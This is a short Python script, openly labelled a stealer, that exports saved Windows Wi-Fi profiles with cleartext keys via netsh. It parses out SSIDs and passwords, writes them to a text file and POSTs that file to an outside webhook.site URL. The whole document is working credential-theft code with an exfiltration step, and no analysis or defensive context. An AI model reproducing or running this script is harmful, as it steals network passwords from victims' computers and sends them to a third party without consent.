import subprocess
import os
import sys
import requests

#Stealer url
url = "https://webhook.site/08333caf-1b4b-4fd0-a3a8-eb98defb03bb"

#create a file"
import sys

password_file = open("passwords.txt", "w")
password_file.write("Hello Sir! Here are your passwords:\n\nhttps://www.youtube.com/watch?v=1nWPbKitj9w\n\n")
password_file.close()

#Lists
wifi_files = []
wifi_name = []
wifi_password = []

#Use Python to execute a Windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

#Grab current directory
path = os.getcwd()
print(path)
#Do the hackies
for filename in os.listdir(path):
    if filename.startswith("wi-fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, "r") as f:
                for line in f.readlines():
                    if "name" in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if "KeyMaterial" in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x,y in zip(wifi_name, wifi_password):
                            sys.stdout = open("passwords.txt", "a")
                            print("SSID: "+x, "Password: "+y, sep = "\n")
                            sys.stdout.close()

#Send the hackies
with open("passwords.txt", "rb") as f:
    r = requests.post(url, data=f)




